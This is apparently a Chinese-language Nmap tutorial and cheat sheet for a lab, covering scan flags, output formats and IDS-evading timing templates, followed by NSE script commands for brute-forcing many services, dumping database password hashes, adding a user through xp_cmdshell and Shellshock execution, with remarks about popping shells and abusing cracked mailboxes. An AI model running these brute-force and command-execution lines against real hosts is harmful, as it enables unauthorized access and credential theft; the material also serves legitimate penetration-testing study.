# NMAP

nmap在kail中已经安装好了，直接调用就可以。

## 默认扫描

```
nmap 172.18.0.18
```

## 网段扫描

```
nmap 172.18.0.0/24
```

## 扫描多个目标

```
nmap 172.18.0.2 172.18.0.11
```

## -v 详细描述输出扫描

加上-v参数进行详细的扫描日志输出
```
nmap -v 172.18.0.0/24
```

## -p 指定端口扫描

使用-p 端口可以进行指导的端口扫描。

```
nmap -p 80,22 172.18.0.0/24
```
扫描端口的时候还可以指定端口的范围进行扫描:
扫描同网段中开启20-100端口范围的的ip
```
nmap -p20-100 172.18.0.0/24
```

## -iL 从文件中读取ip扫描

```
nmap -iL ip.txt
```

## -exclude 设置黑名单扫描ip

nmap可以设置黑名单扫描，不扫描敏感的ip，使用-exclude参数，进行单个ip的排除扫描

```
nmap 172.18.0.0/24 -exclude 172.18.0.1
```

## -sP Ping扫描


使用-sP参数，对内网主机进行探测发现

```
nmap -sP 172.18.0.0/24
```

## -PN 不进行Ping扫描

使用-PN参数，对内网进行No Ping扫描，PN No Ping 扫描，常用来绕过防火墙的检测。

## -sS 半开放式扫描

使用-sS参数，对内网进行半开放式扫描。

若端口扫描没有完成一个完整的TCP连接，在扫描主机和目标主机的一指定端口建立连接时候只完成了前两次握手，在第三步时，扫描主机中断了本次连接，使连接没有完全建立起来，这样的端口扫描称为半连接扫描，也称为间接扫描。现有的半连接扫描有TCPSYN扫描和IP ID头dumb扫描等。

## -sT TCP扫描

使用-sT参数，对内网进行TCP扫描

## -sU UDP扫描

使用-sU参数，对目标靶机进行UDP扫描:

```
nmap -sU 172.18.0.16
```

因为一般情况下这个-sU扫描是测试某个单独的UDP端口是否正常通讯，所以一般-sU常与-P指定端口扫描参数配合使用：

```
nmap -sU -p 22,80 172.18.0.16
```

## -sF FIN标志的数据包扫描

使用-sF参数，对内网进行FIN标志的数据包扫描，探测防火墙的状态，收到RST回复说明该端口关闭，否则说明是open或filtered状态。
```
nmap -sF 172.18.0.16
```
## -sV Version版本检测扫描

```
nmap -sV 172.18.0.16
```

## -O OS操作系统类型的探测

```
nmap -O 172.18.0.16
```
这里还可以使用--osscan-guess参数来猜测匹配的操作系统

```
nmap -O --osscan-guess 172.18.0.16
```

## -traceroute 路由跟踪扫描

如果对外围的目标进行扫描的话，效果要好一点。
```
nmap -traceroute 172.18.0.2
```
## -A 综合扫描

```
nmap -A 172.18.0.2
```

## 常见混合参数


探测同网段开着80端口的ip，并进行系统猜测扫描，并将过程-v详细输出。

```
nmap -v -p 80 -O --osscan-guess 172.18.0.0/24
```
对内网同网段的主机进行批量收集，只收集开了80和22端口的ip
```
nmap -sS -p 22,80 172.18.0.0/24
```
FIN扫描出内网中网段中开启MySQL数据库的所有主机
```
nmap -sF -p3306 172.18.0.0/24
```
## -oN 标准输出

将标准输出直接写入指定的文件，对目标靶机的扫描结果以标准的形式导出为result.txt。

```
nmap -oN result.txt 172.18.0.3
```
## -oX XML输出

XML提供了可供软件解析的稳定格式输出.

```
nmap -oX result.xml 172.18.0.3
```

## -oS ScRipT KIdd|3 oUTpuT

脚本小子输出类似于交互工具输出，这是一个事后处理，适合于 'l33t HaXXorZ， 由于原来全都是大写的Nmap输出。这个选项和脚本小子开了玩笑，看上去似乎是为了 “帮助他们”。

```
nmap -oS result.xml 172.18.0.3
```

## -oG Grep输出

Grep输出是一种简单格式，每行一个主机，可以 通过UNIX工具(如grep、awk、cut、sed、diff)和Perl方便地查找和分解。
```
nmap -oG result.txt 172.18.0.3
```
## -oA 输出至所有格式

利用-oA选项 可将扫描结果以标准格式、XML格式和Grep格式一次性输出。分别存放在 .nmap，.xml和 .gnmap文件中。

```
nmap -oA resut 172.18.0.3
```
## NMAP设置时间参数模板

> paranoid、sneaky 模式用于IDS躲避
> 
> Polite 模式降低了扫描 速度以使用更少的带宽和目标主机资源。
> 
> Normal 为默认模式，因此-T3 实际上是未做任何优化。
> 
> Aggressive 模式假设用户具有合适及可靠的网络从而加速扫描。
> 
> insane 模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性。

### -T0 paranodi

用于躲避IDS进行扫描，耗时非常的长。
```
nmap -T0 172.18.0.3
```
### -T1 sneaky

用于躲避IDS进行扫描，耗时非常的长。
```
nmap -T1 172.18.0.3
```
### -T2 polite

降低了扫描速度以使用更少的带宽和目标主机资源进行对目标靶机进行扫描

```
nmap -T2 172.18.0.3
```

### -T3 normal

默认模式，因此-T3 实际上是未做任何优化的扫描目标靶机

```
nmap -T3 172.18.0.3
```

### -T4 Aggressive

假设用户具有合适及可靠的网络从而加速对目标靶机的扫描。

```
nmap -T4 172.18.0.3
```

### -T5 insane

假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性的对目标靶机进行扫描。

```
nmap -T5 172.18.0.3
```
- NMAP调用脚本进行扫描

```
nmap 的脚本分类
- auth: 负责处理鉴权证书（绕开鉴权）的脚本
- broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务
- brute: 提供暴力破解方式，针对常见的应用如http/snmp等
- default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力
- discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等
- dos: 用于进行拒绝服务攻击
- exploit: 利用已知的漏洞入侵系统
- external: 利用第三方的数据库或资源，例如进行whois解析
- fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 
- intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽
- malware: 探测目标机是否感染了病毒、开启了后门等信息
- safe: 此类与intrusive相反，属于安全性脚本
- version: 负责增强服务与版本扫描（Version Detection）功能的脚本
- vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067
```

## NMAP 脚本使用格式

nmap具体的漏洞扫描脚本参考官方文档 : https://nmap.org/nsedoc/
```
nmap --script='$类别/$具体的脚本'
```
### 脚本格式进阶

```
-sC                             根据端口识别的服务,调用默认脚本
--script=”Lua scripts”          调用的脚本名
--script-args=n1=v1,[n2=v2]     调用的脚本传递的参数
--script-args-file=filename     使用文本传递参数
--script-trace                  显示所有发送和接收到的数据
--script-updatedb               更新脚本的数据库
--script-help=”Lua script”      显示指定脚本的帮助
```
尝试对模板靶机进行-sC扫描，根据端口识别服务自动调用默认脚本。

```
nmap -sC 172.18.0.10
```
### 常用脚本扫描

由于内网靶机开启的端口很少，服务也很少，脚本扫描没有太多的用武之地。下面写一些常见的调用脚本扫描以作了解使用。

#### 探测端口对应的应用版本

```
# nmap -sV -sT -Pn --open -v 192.168.3.23
# nmap -sT -Pn --open -v banner.nse 192.168.3.23
```

#### 和ftp相关的一些漏洞检测脚本

ftp-anon.nse	检查目标ftp是否允许匿名登录,光能登陆还不够,它还会自动检测目录是否可读写,比如你想快速批量抓一些ftp

```
# nmap -p 21 --script ftp-anon.nse -v 192.168.3.23
```

ftp-brute.nse	ftp爆破脚本[默认只会尝试一些比较简单的弱口令,时间可能要稍微长一些(挂vpn以后这个速度可能还会更慢),毕竟直接在公网爆破]

```
# nmap -p 21 --script ftp-brute.nse -v 192.168.3.23
```

ftp-vuln-cve2010-4221.nse    ProFTPD 1.3.3c之前的netio.c文件中的pr_netio_telnet_gets函数中存在多个栈溢出

```
# nmap -p 21 --script ftp-vuln-cve2010-4221.nse -v 192.168.3.23
```

ftp-proftpd-backdoor.nse    ProFTPD 1.3.3c 被人插后门[proftpd-1.3.3c.tar.bz2],缺省只执行id命令,可自行到脚本中它换成能直接弹shell的命令

```
# nmap -p 21 --script ftp-vuln-cve2010-4221.nse -v 192.168.3.23
```

ftp-vsftpd-backdoor.nse    VSFTPD v2.3.4 跟Proftp同样的问题,代码里面插了后门

```
# nmap -p 21 --script ftp-vsftpd-backdoor.nse -v 192.168.3.23
```

#### 和ssh 相关的一些扫描脚本

sshv1.nse    sshv1是可以被中间人的

```
# nmap -p 22 --script sshv1.nse -v 192.168.3.23
```

#### 和smtp,pop3,imap相关的一些扫描脚本

smtp-brute.nse   简单爆破smtp弱口令,拿这个爆进去的邮箱给人发信也许成功率会稍微高一点

```
# nmap -p 25 --script smtp-brute.nse -v 192.168.3.23
```

smtp-enum-users.nse  枚举目标smtp服务器的邮件用户名,前提是目标要存在此错误配置才行,搜集一些必要的信息还是蛮好的

```
# nmap -p 25 --script smtp-enum-users.nse -v 192.168.3.23
```

smtp-vuln-cve2010-4344.nse    Exim 4.70之前版本中的string.c文件中的string_vformat函数中存在堆溢出

```
# nmap -p 25 --script smtp-vuln-cve2010-4344.nse -v 192.168.3.23
```

smtp-vuln-cve2011-1720.nse     Postfix 2.5.13之前版本，2.6.10之前的2.6.x版本，2.7.4之前的2.7.x版本和2.8.3之前的2.8.x版本,存在溢出

```
# nmap -p 25 --script smtp-vuln-cve2011-1720.nse -v 192.168.3.23
```

smtp-vuln-cve2011-1764.nse     Exim dkim_exim_verify_finish() 存在格式字符串漏洞,太老现在基本很难遇到了

```
# nmap -p 25 --script smtp-vuln-cve2011-1764.nse -v 192.168.3.23
```

pop3-brute.nse    pop简单弱口令爆破

```
# nmap -p 110 --script pop3-brute.nse -v 192.168.3.23
```

imap-brute.nse    imap简单弱口令爆破

```
# nmap -p 143,993 --script imap-brute.nse -v 192.168.3.23
```

#### 用DNS进行子域名暴力破解

dns-zone-transfer.nse	检查目标ns服务器是否允许传送,如果能,直接把子域拖出来就好了

```
# nmap -p 53 --script dns-zone-transfer.nse -v 192.168.3.23
# nmap -p 53 --script dns-zone-transfer.nse --script-args dns-zone-transfer.domain=target.org -v 192.168.3.23
```

hostmap-ip2hosts.nse   旁站查询,目测了一下脚本,用的ip2hosts的接口,不过该接口似乎早已停用,如果想继续用,可自行到脚本里把接口部分的代码改掉

```
# nmap -p 80 --script hostmap-ip2hosts.nse 192.168.3.23
```

利用DNS进行子域名暴力破解

```
nmap --script dns-brute www.baidu.com

Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-25 13:12 ?
Nmap scan report for www.baidu.com (180.97.33.108)           
Host is up (0.018s latency).                                 
Other addresses for www.baidu.com (not scanned): 180.97.33.10
Not shown: 998 filtered ports                                
PORT    STATE SERVICE                                        
80/tcp  open  http                                           
443/tcp open  https                                          

Host script results:                                         
| dns-brute:                                                 
|   DNS Brute-force hostnames:                               
|     admin.baidu.com - 10.26.109.19                         
|     mx.baidu.com - 61.135.163.61                           
|     svn.baidu.com - 10.65.211.174                          
|     ads.baidu.com - 10.42.4.225                                         ...    
  ...                                                           
Nmap done: 1 IP address (1 host up) scanned in 92.64 seconds
```

#### informix爆破脚本 informix-brute.nse   

```
# nmap -p 9088 --script informix-brute.nse 192.168.3.23
```

#### mysql 扫描root空密码

mysql-empty-password.nse  

```
# nmap -p 3306 --script mysql-empty-password.nse -v 192.168.3.23
```

####  mysql root弱口令简单爆破

mysql-brute.nse   

```
# nmap -p 3306 --script mysql-brute.nse -v 192.168.3.23

nmap --script=mysql-brute <target>
3306/tcp open  mysql
| mysql-brute:
|   Accounts
|     root:root - Valid credentials
```

#### 导出mysql中所有用户的hash

mysql-dump-hashes.nse    

```
# nmap -p 3306 --script mysql-dump-hashes --script-args='username=root,password=root' 192.168.3.23
```

#### Mysql身份认证漏洞

mysql-vuln-cve2012-2122.nse  [MariaDB and MySQL  5.1.61,5.2.11, 5.3.5, 5.5.22],利用条件有些苛刻 [需要目标的mysql是自己源码编译安装的,这样的成功率相对较高]

```
# nmap -p 3306 --script mysql-vuln-cve2012-2122.nse  -v 192.168.3.23
# nmap -p 445 --script ms-sql-info.nse -v 203.124.11.0/24      ms-sql-info.nse 扫描C段mssql
# nmap -p 1433 --script ms-sql-info.nse --script-args mssql.instance-port=1433 -v 192.168.3.0/24
```

#### mssql扫描sa空密码

ms-sql-empty-password.nse 

```
# nmap -p 1433 --script ms-sql-empty-password.nse -v 192.168.3.0/24
```

####  mssql弱口令爆破

ms-sql-brute.nse   

```
# nmap -p 1433 --script ms-sql-brute.nse -v 192.168.3.0/24

nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt <host>
| ms-sql-brute:
|   [192.168.100.128\TEST]
|     No credentials found
|     Warnings:
|       sa: AccountLockedOut
|   [192.168.100.128\PROD]
|     Credentials found:
|       webshop_reader:secret => Login Success
|       testuser:secret1234 => PasswordMustChange
|_      lordvader:secret1234 => Login Success
```

#### 利用xp_cmdshell,远程执行系统命令

ms-sql-xp-cmdshell.nse   

```
# nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=net user test test add 192.168.3.0/24
```

#### 导出mssql中所有的数据库用户及密码hash

ms-sql-dump-hashes.nse    

```
# nmap -p 1433 --script ms-sql-dump-hashes -v 192.168.3.0/24
```

#### Postgresql爆破

pgsql-brute.nse   

```
# nmap -p 5432 --script pgsql-brute -v 192.168.3.0/24

nmap -p 5432 --script pgsql-brute <host>
5432/tcp open  pgsql
| pgsql-brute:
|   root:<empty> => Valid credentials
|_  test:test => Valid credentials
```

#### Oracle爆破

oracle-brute-stealth.nse  

```
# nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL  -v 192.168.3.0/24

```

oracle-brute.nse

```
# nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL -v 192.168.3.0/24

nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL <host>
PORT     STATE  SERVICE REASON
1521/tcp open  oracle  syn-ack
| oracle-brute:
|   Accounts
|     system:powell => Account locked
|     haxxor:haxxor => Valid credentials
|   Statistics
|_    Perfomed 157 guesses in 8 seconds, average tps: 19
```

#### mongdb爆破

mongodb-brute.nse   

```
# nmap -p 27017  --script mongodb-brute 192.168.3.0/24
```

#### redis爆破

redis-brute.nse   

```
# nmap -p 6379 --script redis-brute.nse 192.168.3.0/24
```


#### **查询VMware服务器（vCenter，ESX，ESXi）SOAP API以提取版本信息。**

```
nmap --script vmware-version -p 443 10.0.1.4

Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-25 12:26 ?D1ú±ê×?ê±??
Nmap scan report for 10.0.1.4
Host is up (0.0019s latency).

PORT    STATE SERVICE
443/tcp open  https
| vmware-version:
|   Server version: VMware ESXi 6.5.0
|   Build: 4887370
|   Locale version: INTL 000
|   OS type: vmnix-x86
|_  Product Line ID: embeddedEsx
Service Info: CPE: cpe:/o:vmware:ESXi:6.5.0

Nmap done: 1 IP address (1 host up) scanned in 6.28 seconds
```

#### snmp扫描脚本

snmp-brute.nse   爆破C段的snmp 

```
# nmap -sU --script snmp-brute --script-args snmp-brute.communitiesdb=user.txt 192.168.3.0/24
```

#### telnet扫描脚本

telnet-brute.nse   简单爆破telnet

```
# nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s -v 192.168.3.0/24
```

#### ldap利用脚本

ldap-brute.nse   简单爆破ldap

```
# nmap -p 389 --script ldap-brute --script-args ldap.base='cn=users,dc=cqure,dc=net' 192.168.3.0/24
```

####   xmpp爆破

xmpp-brute.nse 

```
# nmap -p 5222 --script xmpp-brute.nse  192.168.3.0/24
```

#### IIS短文件扫描

http-iis-short-name-brute.nse  

```
# nmap -p80 --script http-iis-short-name-brute.nse 192.168.3.0/24
```

#### iis 5.0 6.0 webadv写

http-iis-webdav-vuln.nse  

```
# nmap --script http-iis-webdav-vuln.nse -p80,8080 192.168.3.0/24
```

#### bash远程执行

http-shellshock.nse 

```
# nmap -sV -p- --script http-shellshock --script-args uri=cgi-binbin,cmd=ls 192.168.3.0/24
```

#### 探测目标svn

http-svn-info.nse   	

```
# nmap --script http-svn-info 192.168.3.0/24
```

#### drupal、Wordpress枚举脚本

http-drupal-enum.nse   	

http-wordpress-brute.nse

```
# nmap -p80 -sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com,http-wordpress-brute.threads=3,brute.firstonly=true' 192.168.3.0/24
```

#### 网站备份扫描

http-backup-finder.nse   扫描目标网站备份

```
# nmap -p80 --script=http-backup-finder 192.168.3.0/24
```

#### iis6.0远程代码执行

http-vuln-cve2015-1635.nse   iis6.0远程代码执行

```
# nmap -sV --script http-vuln-cve --script-args uri='anotheruri'  192.168.3.0/24
```

#### vpn利用脚本

pptp-version.nse  识别目标pptp版本,暂时只看到一个pptp暂时还好使,其实pptp也是可以爆破的,嘿嘿……不过,实际目标中,pptp几乎没有,openvpn偏多,想直接捅目标内网,这无疑是很不错的入口

```
# nmap -p 1723 --script pptp-version.nse 192.168.3.0/24
```

#### smb漏洞检测脚本

```
smb-vuln-ms08-067.nse
smb-vuln-ms10-054.nse
smb-vuln-ms10-061.nse
smb-vuln-ms17-010.nse  smb远程执行
# nmap -p445 --script smb-vuln-ms17-010.nse 192.168.3.0/24
```

#### 辅助性脚本

```
rsync-brute.nse 爆破目标的rsync
# nmap -p 873 --script rsync-brute --script-args 'rsync-brute.module=www' 192.168.3.0/24
rlogin-brute.nse 爆破目标的rlogin
# nmap -p 513 --script rlogin-brute 192.168.3.0/24
vnc-brute.nse  爆破目标的vnc
# nmap --script vnc-brute -p 5900 192.168.3.0/24
pcanywhere-brute.nse 爆破pcanywhere
# nmap -p 5631 --script=pcanywhere-brute 192.168.3.0/24
nessus-brute.nse 爆破nessus,貌似现在已经不是1241端口了,实在是太老了,直接忽略吧
# nmap --script nessus-brute -p 1241 192.168.3.0/24
nexpose-brute.nse	爆破nexpose
# nmap --script nexpose-brute -p 3780 192.168.3.0/24
shodan-api.nse  配合shodan接口进行扫描,如果自己手里有0day,配合着一起用,这个威力还是不可小觑的,不过在即实际测的时候貌似还有些问题
# nmap --script shodan-api --script-args 'shodan-api.target=192.168.3.0/24,shodan-api.apikey=SHODANAPIKEY'
```

#### 利用nmap一句话对目标C段进行常规漏洞扫描

```
# nmap -sT -Pn -v --script dns-zone-transfer.nse,ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-backup-finder.nse,http-cisco-anyconnect.nse,http-iis-short-name-brute.nse,http-put.nse,http-php-version.nse,http-shellshock.nse,http-robots.txt.nse,http-svn-enum.nse,http-webdav-scan.nse,iis-buffer-overflow.nse,iax2-version.nse,memcached-info.nse,mongodb-info.nse,msrpc-enum.nse,ms-sql-info.nse,mysql-info.nse,nrpe-enum.nse,pptp-version.nse,redis-info.nse,rpcinfo.nse,samba-vuln-cve-2012-1182.nse,smb-vuln-ms08-067.nse,smb-vuln-ms17-010.nse,snmp-info.nse,sshv1.nse,xmpp-info.nse,tftp-enum.nse,teamspeak2-version.nse 192.168.3.0/24
```

#### 利用nmap一句话对目标进行C段弱口令爆破

```
# nmap -sT -v -Pn --script ftp-brute.nse,imap-brute.nse,smtp-brute.nse,pop3-brute.nse,mongodb-brute.nse,redis-brute.nse,ms-sql-brute.nse,rlogin-brute.nse,rsync-brute.nse,mysql-brute.nse,pgsql-brute.nse,oracle-sid-brute.nse,oracle-brute.nse,rtsp-url-brute.nse,snmp-brute.nse,svn-brute.nse,telnet-brute.nse,vnc-brute.nse,xmpp-brute.nse 192.168.3.0/24
```

